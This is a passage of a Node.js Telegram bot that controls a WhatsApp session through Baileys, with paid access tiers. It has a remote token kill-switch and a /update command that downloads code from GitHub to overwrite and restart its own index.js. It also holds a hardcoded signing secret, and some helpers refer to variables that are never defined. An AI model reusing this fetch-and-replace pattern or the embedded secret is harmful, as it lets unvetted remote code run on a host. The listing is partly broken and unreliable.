///CREDIT BASE BY RidzzOffc
/// NO HAPUS CREDIT 
const { Telegraf, Markup, session } = require("telegraf");
const fs = require("fs");
const os = require("os");
const path = require("path");
const ms = require("ms");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_BOT } = require("./config");
const BOT_TOKEN = TOKEN_BOT;

const MODE_FILE = "./mode.json";
const crypto = require("crypto");

const premiumFile = "./database/premiumuser.json";
const adminFile = "./database/adminuser.json";
const ownerFile = "./database/owneruser.json";
const GROUP_FILE = "./groupmode.json";
const antiFotoFile = "./antifoto.json"
const antiVideoFile = "./antivideo.json"

const TOKENS_FILE = "./tokens.json";

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

const maxReconnect = 10;
const usePairingCode = true;

//// image/////

const thumbnailUrl = "https://files.catbox.moe/qszyit.jpg";

///////
function signGroup(group) {
  return crypto.createHmac("sha256", MODE_SECRET).update(group).digest("hex");
}

function getGroupMode() {
  try {
    if (!fs.existsSync(GROUP_FILE)) return "off";

    const data = JSON.parse(fs.readFileSync(GROUP_FILE));

    if (!data.group || !data.sig) return "off";

    if (data.sig !== signGroup(data.group)) {
      console.log("🚫 Group diubah manual!");
      return "off";
    }

    return data.group;
  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err);
    return "off";
  }
}

function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return;

  const data = {
    group,
    sig: signGroup(group)
  };

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2));
  console.log(`✅ Group mode diset ke: ${group}`);
}


const VALID_MODES = ["self", "public"];
const MODE_SECRET = "atomic_secure_key";


function signMode(mode) {
  return crypto.createHmac("sha256", MODE_SECRET).update(mode).digest("hex");
}

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      
      const defaultData = {
        mode: "self",
        sig: signMode("self")
      };

      fs.writeFileSync(MODE_FILE, JSON.stringify(defaultData, null, 2));
      return "self";
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE));

    if (!data.mode || !data.sig) return "self";

    const validSig = signMode(data.mode);
    if (data.sig !== validSig) {
      console.log("🚫 Mode diubah manual!");
      return "self";
    }

    return data.mode;

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err);
    return "self";
  }
}

function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return;

  const data = {
    mode,
    sig: signMode(mode)
  };

  currentMode = mode; 

  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2));
  console.log(`✅ Mode bot diset ke: ${mode}`);
}


let currentMode = getMode();


setInterval(() => {
  const fileMode = getMode();
  if (fileMode !== currentMode) {
    console.log("🚫 Mode diubah manual, restore otomatis!");
    setMode(currentMode);
  }
}, 2000);


function parseCooldown(input) {
  const match = input.match(/^(\d+)([dhms])$/);
  if (!match) return null;

  const value = parseInt(match[1]);
  const unit = match[2];

  switch (unit) {
    case "d": // detik
      return value * 1000;

    case "m": // menit
      return value * 60 * 1000;

    case "h": // jam
      return value * 60 * 60 * 1000;

    case "s": // hari
      return value * 24 * 60 * 60 * 1000;

    default:
      return null;
  }
}


let COOLDOWN_TIME = 1;
let COOLDOWN_TEXT = "1d";
const cooldowns = new Map();

function checkCooldown(ctx, next) {
  if (!ctx.from?.id) return next();


  if (isOwner(ctx.from.id)) return next();


  if (COOLDOWN_TIME === 0) return next();

  const userId = String(ctx.from.id);
  const now = Date.now();

  const expireTime = cooldowns.get(userId) || 0;

  if (now < expireTime) {
    
    if (!cooldowns.get(userId + "_msg")) {
      cooldowns.set(userId + "_msg", true);

      setTimeout(() => cooldowns.delete(userId + "_msg"), 3000);

      return ctx.reply(`⏳ Tunggu ${COOLDOWN_TEXT}!`);
    }
    return;
  }

  
  cooldowns.set(userId, now + COOLDOWN_TIME);

  return next();
}


function antiTamper() {
  try {
 
    if (!fs.existsSync(MODE_FILE)) {
      console.log("⚠️ File mode tidak ditemukan, membuat ulang...");

      const defaultData = {
        mode: "self",
        sig: signMode("self")
      };

      fs.writeFileSync(MODE_FILE, JSON.stringify(defaultData, null, 2));
    }

    const mode = getMode();

 
    if (!VALID_MODES.includes(mode)) {
      console.log("🚨 Mode system rusak!");
      process.exit(1);
    }

  } catch (err) {
    console.log("🚨 Anti tamper error:", err);
    process.exit(1);
  }
}


const spamLimit = new Map();
const SPAM_WINDOW = 5000; 
const SPAM_MAX = 4;      

function antiSpam(ctx) {
  if (!ctx.from?.id) return true; 

  const userId = ctx.from.id;
  const now = Date.now();

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, []);
  }

 
  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW);

 
  timestamps.push(now);
  spamLimit.set(userId, timestamps);

 
  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!");
  }

 
  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000);

  return true;
}


///// ---- ( DATE ) ---- /////
function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}

///// ---- ( RUNTIME & MEMORY ) ---- /////
function runtime(seconds) {
  seconds = Number(seconds);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor(seconds % 3600 / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

function memory() {
  return (process.memoryUsage().rss / 1024 / 1024).toFixed(0) + " MB";
}
// ================= SECURITY ================= //


/// ----- ( Function ensureDataBase ) -------- \\\
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/anything-101/Version3/refs/heads/main/Ridzz.json";////ganti jadi Raw luh



async function fetchValidTokens() {
  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);
    return Array.isArray(data.tokens) ? data.tokens : [];
  } catch (err) {
    console.log(chalk.red("❌ Gagal mengambil token dari GitHub"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token..."));

  const validTokens = await fetchValidTokens();

  if (!validTokens.length) {
    console.log("❌ Gagal ambil token, stop!");
    process.exit(1);
  }

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid"));
    process.exit(1);
  }

  console.log(chalk.green("✅ Token valid"));
  startBot();
}

function startBot() {
  console.log(chalk.red(`⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠛⠛⠛⠟⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⢀⠀⠠⢀⠀⢂⠁⡈⠐⡀⠠⢀⠀⠄⢈⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⡀⢂⠐⡈⠠⢈⠐⠀⠈⠀⠀⠀⢀⠀⠐⡀⢈⠐⡀⢂⡐⢀⠀⡉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡁⠄⢂⠡⠐⡀⠂⠄⠁⡀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢂⠀⢂⠐⡠⢈⠔⡀⢂⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢋⡐⠤⡉⢄⠂⠡⢀⠁⠂⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠂⠠⠐⠠⣈⠐⡌⠰⡈⠹⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠃⣄⠸⠠⡘⢀⡘⠠⠀⠀⠄⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⢀⠀⠃⡀⠄⡘⢃⠄⢣⠸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠃⡜⢠⢃⠱⡐⠠⢀⠀⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠁⠀⡈⠀⡐⢈⠰⡁⢎⡐⢆⡹⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡇⢎⡰⢃⠌⡂⡁⠂⠄⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡐⠈⠤⠑⢢⠑⣢⠐⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡏⢦⠑⡊⡔⠡⡀⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠈⠤⠉⢆⡓⢤⢋⣼⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⢦⡙⠰⡈⠔⡀⢂⠄⡂⣄⣤⣰⣤⣤⣢⣄⠠⢄⡐⠠⠐⡠⢠⣄⣦⣄⣦⣤⣐⡈⢄⡁⢂⠌⢡⠒⡌⢆⡣⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⢢⠅⢣⡉⢦⡱⣎⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⢢⢌⡱⣉⢶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣕⠪⡔⣡⠘⣬⢱⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣎⢇⢢⡝⡲⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢆⡱⠌⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡻⣔⢣⠂⢧⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡌⢢⡓⡱⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠜⡀⠆⡱⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠳⡌⢧⡉⢶⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣇⢣⡱⢁⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠠⠈⠄⠡⠚⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠑⡌⢣⢌⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⢦⠱⡈⠆⢻⣿⣿⣿⣿⣿⣿⣿⡿⠋⡀⢃⠀⠈⠐⠡⢈⠻⣿⣿⣿⣿⣿⣿⣿⣿⠃⡐⢈⠧⣸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣇⢣⡑⡌⢂⡉⠛⡛⠛⠛⠋⠁⢀⠐⠠⢀⣤⣶⣄⠁⠂⠄⠀⡉⠛⠛⠛⠛⠋⢀⠠⢈⠢⠜⣽⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢧⡑⢎⡑⢢⠅⢢⡀⠄⠂⠌⡐⢠⣾⣿⣿⣿⣶⡀⠐⠤⢁⠂⡔⡀⢆⠰⡈⡄⢎⡰⢲⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣯⡷⣯⢧⣛⢦⡱⢌⡘⠄⡌⢹⠻⡛⣙⠻⡛⢅⠊⡔⢢⡑⢦⡹⣬⣳⣵⣻⣮⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢧⣓⢮⡐⢣⠘⡄⠣⠐⡁⠂⢅⠊⡜⢰⢃⡎⣷⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣜⢦⡝⢦⡓⣌⠲⡡⣌⠱⡌⠲⣌⠧⣞⡼⣣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⡍⠓⡯⠓⢹⡬⠗⠵⣎⠷⠩⣗⠎⠛⡞⢡⠓⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⠃⡆⠀⠀⠆⠀⠀⠆⠀⠀⢂⠀⠀⡇⢢⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡜⡠⠉⠒⠅⠂⠐⠓⠀⠒⣁⠊⢀⢣⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡽⣹⠖⡞⢦⠤⡤⠧⢤⠤⡖⢶⠺⣍⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣟⣬⢃⢧⠣⡝⣢⠝⣬⣣⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
YOUR TOKEN VALID 
AUTHOR SCRIPT : @RidzzOffc`))
}

validateToken()

/// ------ Start WhatsApp Session ------ ///
const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log("🚀 Memulai sesi WhatsApp...");

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    console.log("🔐 Siap pairing / reconnect...");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        console.log("🔄 Connecting...");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log("✅ WhatsApp Connected:", linkedWhatsAppNumber);

       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`<blockquote>𝗕𝗟𝗔𝗖𝗞 𝗢𝗥𝗜𝗢𝗡</blockquote>

╭━━━〔 🔗 WHATSAPP STATUS 〕━━━╮
┃ 📱 Number : ${linkedWhatsAppNumber}
┃ ✅ Status : Connected
╰━━━━━━━━━━━━━━━━━━━━╯

🟢 WhatsApp berhasil terhubung`,
              { parse_mode: "HTML" }
            );

          } catch (err) {
            console.log("❌ Gagal edit pesan:", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        console.log("❌ Disconnected:", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          console.log("🚫 Session logout / invalid");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          console.log("⛔ Stop reconnect (limit)");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

        console.log(`♻️ Reconnect dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
    console.log("❌ Error start session:", err);
    isStarting = false;
  }
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("❌ WhatsApp belum connect, /connect dulu");
  }
  return next();
};


const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON corrupt:", file);
    return [];
  }
};

const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed save JSON:", file, err.message);
  }
};


function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session not found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session deleted successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed delete session:", err.message);
    return false;
  }
}

module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};




let ownerUsers   = loadJSON(ownerFile);
let adminUsers   = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);
let adminList    = [];


loadAdmins();




/// ---- OWNER ---- ///
const checkOwner = (ctx, next) => {
  if (!ownerUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("Owner Access\nContact @RidzzOffc");
  }
  return next();
};

/// ---- ADMIN ---- ///
const checkAdmin = (ctx, next) => {
  if (!adminList.includes(ctx.from.id.toString())) {
    return ctx.reply("Admin Access\nContact @RidzzOffc");
  }
  return next();
};

/// ---- PREMIUM ---- ///
const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("Premium Access\nContact @RidzzOffc");
  }
  return next();
};




/// ---- ADD ADMIN ---- ///
function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}

/// ---- REMOVE ADMIN ---- ///
function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

/// ---- SAVE ADMIN ---- ///
function saveAdmins() {
  try {
    fs.writeFileSync("./database/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal save admin:", err.message);
  }
}

/// ---- LOAD ADMIN ---- ///
function loadAdmins() {
  try {
    if (!fs.existsSync("./database/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./database/admins.json", "utf8");
    adminList = JSON.parse(data || "[]");
  } catch (err) {
    console.log("⚠️ Gagal load admin:", err.message);
    adminList = [];
  }
}




/// ---- SLEEP ---- ///
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/// ---- CHECK PREMIUM ---- ///
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

/// ---- CHECK OWNER ---- ///
function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

/// ---- LOAD OWNER ---- ///
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
/// ------ Check Sender ------- \\\
function isSender(userId) {
  return senderUsers.includes(String(userId));
}
// ================= LOGIN SYSTEM ================= //

function checkPassword(input) {
  return input.trim().toLowerCase() === PASSWORD.toLowerCase();
}

function isLogin(userId) {
  return userLogin.has(userId);
}

function addLogin(userId) {
  userLogin.add(userId);
}
// ================= ANTI FOTO =============== //
function loadAntiFoto() {
  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}


function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

/// ------- ANTI VIDIO ------- ///
function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()
/// ---- GROUP ONLY ---- ///
bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return; 
  }

  return next();
});


/// ---- SELF / PUBLIC MODE ---- ///
bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {
    return; 
  }

  return next();
});
/// -------- SET CD ------------///
bot.use((ctx, next) => {
  if (!ctx.from || !ctx.from.id) return next();

  const userId = String(ctx.from.id);
  const now = Date.now();

  if (cooldowns.has(userId)) {
    const expire = cooldowns.get(userId);
    if (now < expire) {
      const sisa = ((expire - now) / 1000).toFixed(1);
      return ctx.reply(`⏳ Tunggu *${sisa} detik* sebelum menggunakan command lain`, { parse_mode: "Markdown" });
    }
  }

  cooldowns.set(userId, now + COOLDOWN_TIME);
  setTimeout(() => cooldowns.delete(userId), COOLDOWN_TIME);

  return next();
});

const fsp = fs.promises;
// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "name gh";
const DEFAULT_REPO = UPD.github_repo_default || "name repo";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "telegraf-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== COMMANDS ==================

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.command("update", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await ctx.reply(`⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`, { parse_mode: "Markdown" });

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
